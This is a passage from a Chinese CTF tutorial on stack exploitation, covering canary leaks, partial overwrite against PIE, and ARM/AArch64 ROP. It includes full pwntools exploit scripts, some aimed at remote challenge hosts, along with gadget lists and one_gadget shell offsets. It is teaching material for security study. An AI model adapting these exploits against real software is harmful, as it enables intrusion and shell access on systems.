[#0] 0x40080e → call 0x4006c0 <_IO_gets@plt>
──────────────────────────────────────────────────────────
gef➤  print $rsp
$1 = (void *) 0x7fffffffda40

```

可以看出 rsp 的值为 0x7fffffffda40，那么相对偏移为

```
>>> 0x00007fffffffdc58-0x7fffffffda40
536
>>> hex(536)
'0x218'

```

#### 利用程序

我们构造利用程序如下

```
from pwn import *
context.log_level = 'debug'
smash = ELF('./smashes')
if args['REMOTE']:
    sh = remote('pwn.jarvisoj.com', 9877)
else:
    sh = process('./smashes')
argv_addr = 0x00007fffffffdc58
name_addr = 0x7fffffffda40
flag_addr = 0x600D20
another_flag_addr = 0x400d20
payload = 'a' * (argv_addr - name_addr) + p64(another_flag_addr)
sh.recvuntil('name? ')
sh.sendline(payload)
sh.recvuntil('flag: ')
sh.sendline('bb')
data = sh.recv()
sh.interactive()

```

这里我们直接就得到了 flag，没有出现网上说的得不到 flag 的情况。

### 题目

*   2018 网鼎杯 - guess

栈上的 partial overwrite
---------------------

partial overwrite 这种技巧在很多地方都适用, 这里先以栈上的 partial overwrite 为例来介绍这种思想。

我们知道, 在开启了随机化（ASLR，PIE）后, 无论高位的地址如何变化，低 12 位的页内偏移始终是固定的, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护。

### 2018 - 安恒杯 - babypie

以安恒杯 2018 年 7 月月赛的 babypie 为例分析这一种利用技巧, 题目的 binary 放在了 [ctf-challenge](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/partial_overwrite) 中

#### 确定保护

```
babypie: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=77a11dbd367716f44ca03a81e8253e14b6758ac3, stripped
[*] '/home/m4x/pwn_repo/LinkCTF_2018.7_babypie/babypie'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

```

64 位动态链接的文件, 开启了 PIE 保护和栈溢出保护

#### 分析程序

IDA 中看一下, 很容易就能发现漏洞点, 两处输入都有很明显的栈溢出漏洞, 需要注意的是在输入之前, 程序对栈空间进行了清零, 这样我们就无法通过打印栈上信息来 leak binary 或者 libc 的基址了

```
__int64 sub_960()
{
  char buf[40]; // [rsp+0h] [rbp-30h]
  unsigned __int64 v2; // [rsp+28h] [rbp-8h]
  v2 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  *(_OWORD *)buf = 0uLL;
  *(_OWORD *)&buf[16] = 0uLL;
  puts("Input your Name:");
  read(0, buf, 0x30uLL);                        // overflow
  printf("Hello %s:\n", buf, *(_QWORD *)buf, *(_QWORD *)&buf[8], *(_QWORD *)&buf[16], *(_QWORD *)&buf[24]);
  read(0, buf, 0x60uLL);                        // overflow
  return 0LL;
}

```

同时也发现程序中给了能直接 get shell 的函数

```
.text:0000000000000A3E getshell        proc near
.text:0000000000000A3E ; __unwind { .text:0000000000000A3E                 push    rbp
.text:0000000000000A3F                 mov     rbp, rsp
.text:0000000000000A42                 lea     rdi, command    ; "/bin/sh"
.text:0000000000000A49                 call    _system
.text:0000000000000A4E                 nop
.text:0000000000000A4F                 pop     rbp
.text:0000000000000A50                 retn
.text:0000000000000A50 ; } // starts at A3E
.text:0000000000000A50 getshell        endp

```

这样我们只要控制 rip 到该函数即可

#### leak canary

在第一次 read 之后紧接着就有一个输出, 而 read 并不会给输入的末尾加上 \0, 这就给了我们 leak 栈上内容的机会。

为了第二次溢出能控制返回地址, 我们选择 leak canary. 可以计算出第一次 read 需要的长度为 0x30 - 0x8 + 1 (+ 1 是为了覆盖 canary 的最低位为非 0 的值, printf 使用 %s 时, 遇到 \0 结束, 覆盖 canary 低位为非 0 值时, canary 就可以被 printf 打印出来了)

```
Breakpoint 1, 0x0000557c8443aa08 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────
 RAX  0x0
 RBX  0x0
 RCX  0x7f1898a64690 (__read_nocancel+7) ◂— cmp    rax, -0xfff
 RDX  0x30
 RDI  0x557c8443ab15 ◂— insb   byte ptr [rdi], dx /* 'Hello %s:\n' */
 RSI  0x7ffd97aa0410 ◂— 0x6161616161616161 ('aaaaaaaa')
 R8   0x7f1898f1d700 ◂— 0x7f1898f1d700
 R9   0x7f1898f1d700 ◂— 0x7f1898f1d700
 R10  0x37b
 R11  0x246
 R12  0x557c8443a830 ◂— xor    ebp, ebp
 R13  0x7ffd97aa0540 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7ffd97aa0440 —▸ 0x7ffd97aa0460 —▸ 0x557c8443aa80 ◂— push   r15
 RSP  0x7ffd97aa0410 ◂— 0x6161616161616161 ('aaaaaaaa')
 RIP  0x557c8443aa08 ◂— call   0x557c8443a7e0
───────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────
 ► 0x557c8443aa08    call   0x557c8443a7e0
   0x557c8443aa0d    lea    rax, [rbp - 0x30]
   0x557c8443aa11    mov    edx, 0x60
   0x557c8443aa16    mov    rsi, rax
   0x557c8443aa19    mov    edi, 0
   0x557c8443aa1e    call   0x557c8443a7f0
   0x557c8443aa23    mov    eax, 0
   0x557c8443aa28    mov    rcx, qword ptr [rbp - 8]
   0x557c8443aa2c    xor    rcx, qword ptr fs:[0x28]
   0x557c8443aa35    je     0x557c8443aa3c
   0x557c8443aa37    call   0x557c8443a7c0
────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────
00:0000│ rsi rsp  0x7ffd97aa0410 ◂— 0x6161616161616161 ('aaaaaaaa')
... ↓
05:0028│          0x7ffd97aa0438 ◂— 0xb3012605fc402a61
06:0030│ rbp      0x7ffd97aa0440 —▸ 0x7ffd97aa0460 —▸ 0x557c8443aa80 ◂— push   r15
07:0038│          0x7ffd97aa0448 —▸ 0x557c8443aa6a ◂— mov    eax, 0
Breakpoint *(0x557c8443a000+0xA08)
pwndbg> canary
$1 = 0
canary : 0xb3012605fc402a00
pwndbg>

```

canary 在 rbp - 0x8 的位置上, 可以看出此时 canary 的低位已经被覆盖为 0x61, 这样只要接收 ‘a’ * (0x30 - 0x8 + 1) 后的 7 位, 再加上最低位的 ‘\0’, 我们就恢复出程序的 canary 了

#### 覆盖返回地址

有了 canary 后, 就可以通过第二次的栈溢出来改写返回地址了, 控制返回地址到 getshell 函数即可, 我们先看一下没溢出时的返回地址

```
0x000055dc43694a1e in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────
 RAX  0x7fff9aa3af20 ◂— 0x6161616161616161 ('aaaaaaaa')
 RBX  0x0
 RCX  0x7f206c6696f0 (__write_nocancel+7) ◂— cmp    rax, -0xfff
 RDX  0x60
 RDI  0x0
 RSI  0x7fff9aa3af20 ◂— 0x6161616161616161 ('aaaaaaaa')
 R8   0x7f206cb22700 ◂— 0x7f206cb22700
 R9   0x3e
 R10  0x73
 R11  0x246
 R12  0x55dc43694830 ◂— xor    ebp, ebp
 R13  0x7fff9aa3b050 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fff9aa3af50 —▸ 0x7fff9aa3af70 —▸ 0x55dc43694a80 ◂— push   r15
 RSP  0x7fff9aa3af20 ◂— 0x6161616161616161 ('aaaaaaaa')
 RIP  0x55dc43694a1e ◂— call   0x55dc436947f0
───────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────
   0x55dc43694a08    call   0x55dc436947e0
   0x55dc43694a0d    lea    rax, [rbp - 0x30]
   0x55dc43694a11    mov    edx, 0x60
   0x55dc43694a16    mov    rsi, rax
   0x55dc43694a19    mov    edi, 0
 ► 0x55dc43694a1e    call   0x55dc436947f0
   0x55dc43694a23    mov    eax, 0
   0x55dc43694a28    mov    rcx, qword ptr [rbp - 8]
   0x55dc43694a2c    xor    rcx, qword ptr fs:[0x28]
   0x55dc43694a35    je     0x55dc43694a3c
   0x55dc43694a37    call   0x55dc436947c0
────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────
00:0000│ rax rsi rsp  0x7fff9aa3af20 ◂— 0x6161616161616161 ('aaaaaaaa')
... ↓
05:0028│              0x7fff9aa3af48 ◂— 0xbfe0cfbabccd2861
06:0030│ rbp          0x7fff9aa3af50 —▸ 0x7fff9aa3af70 —▸ 0x55dc43694a80 ◂— push   r15
07:0038│              0x7fff9aa3af58 —▸ 0x55dc43694a6a ◂— mov    eax, 0
pwndbg> x/10i (0x0A3E+0x55dc43694000) 
   0x55dc43694a3e:    push   rbp
   0x55dc43694a3f:    mov    rbp,rsp
   0x55dc43694a42:    lea    rdi,[rip+0xd7]        # 0x55dc43694b20
   0x55dc43694a49:    call   0x55dc436947d0
   0x55dc43694a4e:    nop
   0x55dc43694a4f:    pop    rbp
   0x55dc43694a50:    ret    
   0x55dc43694a51:    push   rbp
   0x55dc43694a52:    mov    rbp,rsp
   0x55dc43694a55:    sub    rsp,0x10

```

可以发现, 此时的返回地址与 get shell 函数的地址只有低位的 16 bit 不同, 如果覆写低 16 bit 为 `0x?A3E`, 就有一定的几率 get shell

最终的脚本如下:

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
#  context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
while True:
    try:
        io = process("./babypie", timeout = 1)
        #  gdb.attach(io)
        io.sendafter(":\n", 'a' * (0x30 - 0x8 + 1))
        io.recvuntil('a' * (0x30 - 0x8 + 1))
        canary = '\0' + io.recvn(7)
        success(canary.encode('hex'))
        #  gdb.attach(io)
        io.sendafter(":\n", 'a' * (0x30 - 0x8) + canary + 'bbbbbbbb' + '\x3E\x0A')
        io.interactive()
    except Exception as e:
        io.close()
        print e

```

需要注意的是, 这种技巧不止在栈上有效, 在堆上也是一种有效的绕过地址随机化的手段

### 2018-XNUCA-gets

这个题目也挺有意思的，如下

```
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char *v4; // [rsp+0h] [rbp-18h]
  gets((char *)&v4);
  return 0LL;
}

```

程序就这么小，很明显有一个栈溢出的漏洞，然而没有任何 leak。。

#### 确定保护

先来看看程序的保护

```
[*] '/mnt/hgfs/CTF/2018/1124XNUCA/pwn/gets/gets'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```

比较好的是程序没有 canary，自然我们很容易控制程序的 EIP，但是控制到哪里是一个问题。

#### 分析

我们通过 ELF 的基本执行流程（可执行文件部分）来知道程序的基本执行流程，与此同时我们发现在栈上存在着两个函数的返回地址。

```
pwndbg> stack 25
00:0000│ rsp  0x7fffffffe398 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax
01:0008│      0x7fffffffe3a0 ◂— 0x1
02:0010│      0x7fffffffe3a8 —▸ 0x7fffffffe478 —▸ 0x7fffffffe6d9 ◂— 0x6667682f746e6d2f ('/mnt/hgf')
03:0018│      0x7fffffffe3b0 ◂— 0x1f7ffcca0
04:0020│      0x7fffffffe3b8 —▸ 0x400420 ◂— sub    rsp, 0x18
05:0028│      0x7fffffffe3c0 ◂— 0x0
06:0030│      0x7fffffffe3c8 ◂— 0xf086047f3fb49558
07:0038│      0x7fffffffe3d0 —▸ 0x400440 ◂— xor    ebp, ebp
08:0040│      0x7fffffffe3d8 —▸ 0x7fffffffe470 ◂— 0x1
09:0048│      0x7fffffffe3e0 ◂— 0x0
... ↓
0b:0058│      0x7fffffffe3f0 ◂— 0xf79fb00f2749558
0c:0060│      0x7fffffffe3f8 ◂— 0xf79ebba9ae49558
0d:0068│      0x7fffffffe400 ◂— 0x0
... ↓
10:0080│      0x7fffffffe418 —▸ 0x7fffffffe488 —▸ 0x7fffffffe704 ◂— 0x504d554a4f545541 ('AUTOJUMP')
11:0088│      0x7fffffffe420 —▸ 0x7ffff7ffe168 ◂— 0x0
12:0090│      0x7fffffffe428 —▸ 0x7ffff7de77cb (_dl_init+139) ◂— jmp    0x7ffff7de77a0

```

其中 `__libc_start_main+240` 位于 libc 中，`_dl_init+139` 位于 ld 中

```
0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so
0x7ffff7bcd000     0x7ffff7dcd000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
0x7ffff7dcd000     0x7ffff7dd1000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
0x7ffff7dd1000     0x7ffff7dd3000 rw-p     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so
0x7ffff7dd3000     0x7ffff7dd7000 rw-p     4000 0
0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000 0      /lib/x86_64-linux-gnu/ld-2.23.so

```

一个比较自然的想法就是我们通过 partial overwrite 来修改这两个地址到某个获取 shell 的位置，那自然就是 Onegadget 了。那么我们究竟覆盖哪一个呢？？

我们先来分析一下 `libc` 的基地址 `0x7ffff7a0d000`。我们一般要覆盖字节的话，至少要覆盖 1 个半字节才能够获取跳到 onegadget。然而，程序中读取的时候是 `gets`读取的，也就意味着字符串的末尾肯定会存在`\x00`。

而我们覆盖字节的时候必须覆盖整数倍个数，即至少会覆盖 3 个字节，而我们再来看看`__libc_start_main+240` 的地址 `0x7ffff7a2d830`，如果覆盖 3 个字节，那么就是 `0x7ffff700xxxx`，已经小于了 libc 的基地址了，前面也没有刻意执行的代码位置。

一般来说 libc_start_main 在 libc 中的偏移不会差的太多，那么显然我们如果覆盖 `__libc_start_main+240` ，显然是不可能的。

而 ld 的基地址呢？如果我们覆盖了栈上`_dl_init+139`，即为`0x7ffff700xxxx`。而观察上述的内存布局，我们可以发现`libc`位于 `ld` 的低地址方向，那么在随机化的时候，很有可能 libc 的第 3 个字节是为`\x00` 的。

举个例子，目前两者之间的偏移为

```
0x7ffff7dd7000-0x7ffff7a0d000=0x3ca000
```

那么如果 ld 被加载到了 `0x7ffff73ca000`，则显然 `libc` 的起始地址就是`0x7ffff7000000`。

因此，我们有足够的理由选择覆盖栈上存储的`_dl_init+139`。那么覆盖成什么呢？还不知道。因为我们还不知道 libc 的库版本是什么，，

我们可以先随便覆盖覆盖，看看程序会不会崩溃，毕竟此时很有可能会执行 libc 库中的代码。

```
from pwn import *
context.terminal = ['tmux', 'split', '-h']
#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
if args['DEBUG']:
    context.log_level = 'debug'
elfpath = './gets'
context.binary = elfpath
elf = ELF(elfpath)
bits = elf.bits
def exp(ip, port):
    for i in range(0x1000):
        if args['REMOTE']:
            p = remote(ip, port)
        else:
            p = process(elfpath, timeout=2)
        # gdb.attach(p)
        try:
            payload = 0x18 * 'a' + p64(0x40059B)
            for _ in range(2):
                payload += 'a' * 8 * 5 + p64(0x40059B)
            payload += 'a' * 8 * 5 + p16(i)
            p.sendline(payload)
            data = p.recv()
            print data
            p.interactive()
            p.close()
        except Exception:
            p.close()
            continue
if __name__ == "__main__":
    exp('106.75.4.189', 35273)

```

最后发现报出了如下错误，一方面，我们可以判断出这肯定是 2.23 版本的 libc；另外一方面，我们我们可以通过`(cfree+0x4c)[0x7f57b6f9253c]`来最终定位 libc 的版本。

```
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f57b6f857e5]
/lib/x86_64-linux-gnu/libc.so.6(+0x8037a)[0x7f57b6f8e37a]
/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7f57b6f9253c]
/lib/x86_64-linux-gnu/libc.so.6(+0xf2c40)[0x7f57b7000c40]
[0x7ffdec480f20]
======= Memory map: ========
00400000-00401000 r-xp 00000000 00:28 48745                              /mnt/hgfs/CTF/2018/1124XNUCA/pwn/gets/gets
00600000-00601000 r--p 00000000 00:28 48745                              /mnt/hgfs/CTF/2018/1124XNUCA/pwn/gets/gets
00601000-00602000 rw-p 00001000 00:28 48745                              /mnt/hgfs/CTF/2018/1124XNUCA/pwn/gets/gets
00b21000-00b43000 rw-p 00000000 00:00 0                                  [heap]
7f57b0000000-7f57b0021000 rw-p 00000000 00:00 0
7f57b0021000-7f57b4000000 ---p 00000000 00:00 0
7f57b6cf8000-7f57b6d0e000 r-xp 00000000 08:01 914447                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f57b6d0e000-7f57b6f0d000 ---p 00016000 08:01 914447                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f57b6f0d000-7f57b6f0e000 rw-p 00015000 08:01 914447                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f57b6f0e000-7f57b70ce000 r-xp 00000000 08:01 914421                     /lib/x86_64-linux-gnu/libc-2.23.so
7f57b70ce000-7f57b72ce000 ---p 001c0000 08:01 914421                     /lib/x86_64-linux-gnu/libc-2.23.so
7f57b72ce000-7f57b72d2000 r--p 001c0000 08:01 914421                     /lib/x86_64-linux-gnu/libc-2.23.so
7f57b72d2000-7f57b72d4000 rw-p 001c4000 08:01 914421                     /lib/x86_64-linux-gnu/libc-2.23.so
7f57b72d4000-7f57b72d8000 rw-p 00000000 00:00 0
7f57b72d8000-7f57b72fe000 r-xp 00000000 08:01 914397                     /lib/x86_64-linux-gnu/ld-2.23.so
7f57b74ec000-7f57b74ef000 rw-p 00000000 00:00 0
7f57b74fc000-7f57b74fd000 rw-p 00000000 00:00 0
7f57b74fd000-7f57b74fe000 r--p 00025000 08:01 914397                     /lib/x86_64-linux-gnu/ld-2.23.so
7f57b74fe000-7f57b74ff000 rw-p 00026000 08:01 914397                     /lib/x86_64-linux-gnu/ld-2.23.so
7f57b74ff000-7f57b7500000 rw-p 00000000 00:00 0
7ffdec460000-7ffdec481000 rw-p 00000000 00:00 0                          [stack]
7ffdec57f000-7ffdec582000 r--p 00000000 00:00 0                          [vvar]
7ffdec582000-7ffdec584000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]

```

确定好了 libc 的版本后，我们可以选一个 one_gadget，这里我选择第一个，较低地址的。

```
➜  gets one_gadget /lib/x86_64-linux-gnu/libc.so.6
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL
0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL
0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL
0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

```

使用如下 exp 继续爆破，

```
from pwn import *
context.terminal = ['tmux', 'split', '-h']
#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
if args['DEBUG']:
    context.log_level = 'debug'
elfpath = './gets'
context.binary = elfpath
elf = ELF(elfpath)
bits = elf.bits
def exp(ip, port):
    for i in range(0x1000):
        if args['REMOTE']:
            p = remote(ip, port)
        else:
            p = process(elfpath, timeout=2)
        # gdb.attach(p)
        try:
            payload = 0x18 * 'a' + p64(0x40059B)
            for _ in range(2):
                payload += 'a' * 8 * 5 + p64(0x40059B)
            payload += 'a' * 8 * 5 + '\x16\02'
            p.sendline(payload)
            p.sendline('ls')
            data = p.recv()
            print data
            p.interactive()
            p.close()
        except Exception:
            p.close()
            continue
if __name__ == "__main__":
    exp('106.75.4.189', 35273)

```

最后获取到 shell。

```
$ ls
exp.py  gets

```

### 题目

介绍
--

因为目前为止，arm， mips 等架构出现的 pwn 还是较简单的栈漏洞，因此目前只打算介绍 arm 下的 rop，其他漏洞的利用以后会逐渐介绍

预备知识
----

先看一下 arm 下的函数调用约定，函数的第 1 ～ 4 个参数分别保存在 **r0 ～ r3** 寄存器中， 剩下的参数从右向左依次入栈， 被调用者实现栈平衡，函数的返回值保存在 **r0** 中

![][img-2]

除此之外，arm 的 **b/bl** 等指令实现跳转; **pc** 寄存器相当于 x86 的 eip，保存下一条指令的地址，也是我们要控制的目标

jarvisoj - typo
---------------

这里以 jarvisoj 的 typo 一题为例进行展示，题目可以在 [ctf-challenge](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/arm/jarvisOJ_typo) 下载

### 确定保护

```
jarvisOJ_typo [master●●] check ./typo
typo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped
[*] '/home/m4x/pwn_repo/jarvisOJ_typo/typo'
    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8000)

```

静态链接的程序，没有开栈溢出保护和 PIE; 静态链接说明我们可以在 binary 里找到 **system** 等危险函数和 **“/bin/sh”** 等敏感字符串，因为又是 No PIE， 所以我们只需要栈溢出就能构造 ropchain 来 get shell

### 利用思路

因此需要我们找一个溢出点，先运行一下程序，因为是静态链接的，所以在环境配置好的情况下直接运行即可

```
jarvisOJ_typo [master●●] ./typo 
Let's Do Some Typing Exercise~
Press Enter to get start;
Input ~ if you want to quit
------Begin------
throng
throng
survive
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
qemu: uncaught target signal 11 (Segmentation fault) - core dumped
[1]    1172 segmentation fault  ./typo

```

程序的输入点不多，很容易就能找到溢出点

### 构造 ROP

因此思路就很明显了，利用栈溢出构造 **system(“/bin/sh”)**， 先找一下 gadgets

```
jarvisOJ_typo [master●●] ROPgadget --binary ./typo --only "pop"   
Gadgets information
============================================================
0x00020904 : pop {r0, r4, pc}
0x00068bec : pop {r1, pc}
0x00008160 : pop {r3, pc}
0x0000ab0c : pop {r3, r4, r5, pc}
0x0000a958 : pop {r3, r4, r5, r6, r7, pc}
0x00014a70 : pop {r3, r4, r7, pc}
0x000083b0 : pop {r4, pc}
0x00009284 : pop {r4, r5, pc}
0x000095b8 : pop {r4, r5, r6, pc}
0x000082e8 : pop {r4, r5, r6, r7, pc}
0x00023ed4 : pop {r4, r5, r7, pc}
0x00023dbc : pop {r4, r7, pc}
0x00014068 : pop {r7, pc}
Unique gadgets found: 13

```

我们只需要控制第一个参数，因此可以选择 `pop {r0, r4, pc}` 这条 gadgets, 来构造如下的栈结构

```
+-------------+
|             |
|  padding    |
+-------------+
|  padding    | <- frame pointer
+-------------+ 
|gadgets_addr | <- return address
+-------------+
|binsh_addr   |
+-------------+
|junk_data    |
+-------------+
|system_addr  |
+-------------+

```

这时还需要 padding 的长度和 system 以及 /bin/sh 的地址， /bin/sh 的地址用 ROPgadget 就可以找到

```
jarvisOJ_typo [master●●] ROPgadget --binary ./typo --string /bin/sh
Strings information
============================================================
0x0006cb70 : /bin/sh

```

padding 的长度可以使用 pwntools 的 **cyclic** 来很方便的找到

```
pwndbg> cyclic 200
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
pwndbg> c
Continuing.
Program received signal SIGSEGV, Segmentation fault.
0x62616164 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────
 R0   0x0
 R1   0xfffef024 ◂— 0x61616161 ('aaaa')
 R2   0x7e
 R3   0x0
 R4   0x62616162 ('baab')
 R5   0x0
 R6   0x0
 R7   0x0
 R8   0x0
 R9   0xa5ec ◂— push   {r3, r4, r5, r6, r7, r8, sb, lr}
 R10  0xa68c ◂— push   {r3, r4, r5, lr}
 R11  0x62616163 ('caab')
 R12  0x0
 SP   0xfffef098 ◂— 0x62616165 ('eaab')
 PC   0x62616164 ('daab')
───────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────
Invalid address 0x62616164
────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────
00:0000│ sp  0xfffef098 ◂— 0x62616165 ('eaab')
01:0004│     0xfffef09c ◂— 0x62616166 ('faab')
02:0008│     0xfffef0a0 ◂— 0x62616167 ('gaab')
03:000c│     0xfffef0a4 ◂— 0x62616168 ('haab')
04:0010│     0xfffef0a8 ◂— 0x62616169 ('iaab')
05:0014│     0xfffef0ac ◂— 0x6261616a ('jaab')
06:0018│     0xfffef0b0 ◂— 0x6261616b ('kaab')
07:001c│     0xfffef0b4 ◂— 0x6261616c ('laab')
Program received signal SIGSEGV
pwndbg> cyclic -l 0x62616164
112

```

因此 padding 长度即为 112

> 或者可以更暴力一点直接爆破栈溢出的长度

至于 system 的地址，因为这个 binary 被去除了符号表，我们可以先用 `rizzo` 来恢复部分符号表（关于恢复符号表暂时可以先看参考链接，以后会逐渐介绍）。虽然 rizzo 在这个 binary 上恢复的效果不好，但很幸运，在识别出来的几个函数中刚好有 system

```
char *__fastcall system(int a1)
{
  char *result; // r0
  if ( a1 )
    result = sub_10BA8(a1);
  else
    result = (char *)(sub_10BA8((int)"exit 0") == 0);
  return result;
}

```

> 或者可以通过搜索 /bin/sh 字符串来寻找 system 函数

exp
---

所有的条件都有了，构造 system(“/bin/sh”) 即可

```
jarvisOJ_typo [master●●] cat solve.py 
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys
import pdb
#  context.log_level = "debug"
#  for i in range(100, 150)[::-1]:
for i in range(112, 123):
    if sys.argv[1] == "l":
        io = process("./typo", timeout = 2)
    elif sys.argv[1] == "d":
        io = process(["qemu-arm", "-g", "1234", "./typo"])
    else:
        io = remote("pwn2.jarvisoj.com", 9888, timeout = 2)
    io.sendafter("quit\n", "\n")
    io.recvline()
    '''
    jarvisOJ_typo [master●●] ROPgadget --binary ./typo --string /bin/sh
    Strings information
    ============================================================
    0x0006c384 : /bin/sh
    jarvisOJ_typo [master●●] ROPgadget --binary ./typo --only "pop|ret" | grep r0
    0x00020904 : pop {r0, r4, pc}
    '''
    payload = 'a' * i + p32(0x20904) + p32(0x6c384) * 2 + p32(0x110B4)
    success(i)
    io.sendlineafter("\n", payload)
    #  pause()
    try:
        #  pdb.set_trace()
        io.sendline("echo aaaa")
        io.recvuntil("aaaa", timeout = 1)
    except EOFError:
        io.close()
        continue
    else:
        io.interactive()

```

2018 上海市大学生网络安全大赛 - baby_arm
----------------------------

### 静态分析

题目给了一个 `aarch64` 架构的文件，没有开 canary 保护

```
Shanghai2018_baby_arm [master] check ./pwn
+ file ./pwn
./pwn: ELF 64-bit LSB executable, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, for GNU/Linux 3.7.0, BuildID[sha1]=e988eaee79fd41139699d813eac0c375dbddba43, stripped
+ checksec ./pwn
[*] '/home/m4x/pwn_repo/Shanghai2018_baby_arm/pwn'
    Arch:     aarch64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```

看一下程序逻辑

```
__int64 main_logic()
{
  Init();
  write(1LL, "Name:", 5LL);
  read(0LL, input, 512LL);
  sub_4007F0();
  return 0LL;
}
void sub_4007F0()
{
  __int64 v0; // [xsp+10h] [xbp+10h]
  read(0LL, &v0, 512LL);
}

```

程序的主干读取了 512 个字符到一个全局变量上，而在 `sub_4007F0()` 中，又读取了 512 个字节到栈上，需要注意的是这里直接从 `frame pointer + 0x10` 开始读取，因此即使开了 canary 保护也无所谓。

### 思路

理一下思路，可以直接 rop，但我们不知道远程的 libc 版本，同时也发现程序中有调用 `mprotect` 的代码段

```
.text:00000000004007C8                 STP             X29, X30, [SP,#-0x10]!
.text:00000000004007CC                 MOV             X29, SP
.text:00000000004007D0                 MOV             W2, #0
.text:00000000004007D4                 MOV             X1, #0x1000
.text:00000000004007D8                 MOV             X0, #0x1000
.text:00000000004007DC                 MOVK            X0, #0x41,LSL#16
.text:00000000004007E0                 BL              .mprotect
.text:00000000004007E4                 NOP
.text:00000000004007E8                 LDP             X29, X30, [SP],#0x10
.text:00000000004007EC                 RET

```

但这段代码把 `mprotect` 的权限位设成了 0，没有可执行权限，这就需要我们通过 rop 控制 `mprotect` 设置如 bss 段等的权限为可写可执行

因此可以有如下思路：

1.  第一次输入 name 时，在 bss 段写上 shellcode
2.  通过 rop 调用 mprotect 改变 bss 的权限
3.  返回到 bss 上的 shellcode

`mprotect` 需要控制三个参数，可以考虑使用 [ret2csu](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium_rop/#ret2csu) 这种方法，可以找到如下的 gadgets 来控制 `x0, x1, x2` 寄存器

```
.text:00000000004008AC                 LDR             X3, [X21,X19,LSL#3]
.text:00000000004008B0                 MOV             X2, X22
.text:00000000004008B4                 MOV             X1, X23
.text:00000000004008B8                 MOV             W0, W24
.text:00000000004008BC                 ADD             X19, X19, #1
.text:00000000004008C0                 BLR             X3
.text:00000000004008C4                 CMP             X19, X20
.text:00000000004008C8                 B.NE            loc_4008AC
.text:00000000004008CC
.text:00000000004008CC loc_4008CC                              ; CODE XREF: sub_400868+3C↑j
.text:00000000004008CC                 LDP             X19, X20, [SP,#var_s10]
.text:00000000004008D0                 LDP             X21, X22, [SP,#var_s20]
.text:00000000004008D4                 LDP             X23, X24, [SP,#var_s30]
